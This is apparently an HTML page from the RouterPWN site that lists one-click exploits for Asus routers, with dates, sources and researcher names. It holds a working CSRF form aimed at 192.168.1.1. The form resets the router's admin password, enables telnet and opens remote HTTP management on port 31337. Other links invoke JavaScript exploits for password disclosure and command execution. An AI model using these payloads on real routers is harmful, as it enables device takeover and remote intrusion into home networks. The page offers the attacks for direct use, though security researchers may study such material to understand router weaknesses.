@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - Asus - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="asus">
+       <h1>
+        Asus
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form action="http://192.168.1.1/start_apply.htm" id="N56U" method="post" name="N56U">
+          <input name="http_username" type="hidden" value="admin"/>
+          <!-- Admin Username -->
+          <input name="http_passwd" type="hidden" value="password"/>
+          <!--Admin Password  -->
+          <input name="http_passwd2" type="hidden" value="password"/>
+          <!--Admin Password  -->
+          <input name="v_password2" type="hidden" value="password"/>
+          <input name="telnetd_enable" type="hidden" value="1"/>
+          <!--Enable Telnet-LAN Only-->
+          <input name="misc_http_x" type="hidden" value="1"/>
+          <!--Enable HTTP Remote MGMT -->
+          <input name="misc_httpport_x" type="hidden" value="31337"/>
+          <!--HTTP Remote MGMT Port-->
+          <input name="action_mode" type="hidden" value="apply"/>
+         </form>
+<tr>
+    <td>01/15/14</td>
+    <td>One click</td>
+    <td><a href="https://sintonen.fi/advisories/asus-router-auth-bypass.txt">Sintonen</a></td>
+    <td><a href="javascript:rtn16_passdisclosure()">ASUS RT-N16 - Text-plain Admin Password Disclosure</a>
+    <a href="javascript:rtn16_passdisclosure(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></td>
+    <td>Harry Sintonen</td>
+</tr>
+          <tr>
+    <td>09/10/13</td>
+    <td>One click</td>
+    <td><a href="http://www.qxcg.net/arbitrary-command-execution-on-an-asus-rtn66u.html">QXCG</a></td>
+    <td><a href="javascript:rtn66uexe()">RT-N66U command execution</a>
+    <a href="javascript:rtn66uexe()">[SET IP]</a></td>
+    <td>qxcg</td>
+</tr>
+
+<tr>
+    <td>08/13/13</td>
+    <td>One click</td>
+    <td><a href="http://securityevaluators.com/content/case-studies/routers/asus_rtn56u.jsp">SecurityEvaluators</a></td>
+    <td><a href="javascript:N56Uexe()">RT-N56U RT-AC66U command execution</a>
+    <a href="javascript:N56Uuexe()">[SET IP]</a></td>
+    <td>Jacob Holcomb</td>
+</tr>
+
+<tr>
+    <td>08/13/13</td>
+    <td>One click</td>
+    <td><a href="http://securityevaluators.com/content/case-studies/routers/asus_rtn56u.jsp">SecurityEvaluators</a></td>
+    <td><a href="javascript:document.N56U.submit();">RT-N56U RT-AC66U reset admin password enable remote http csrf</a>
+    <a href="javascript:N56Ur()">[SET IP]</a></td>
+    <td>Jacob Holcomb</td>
+</tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
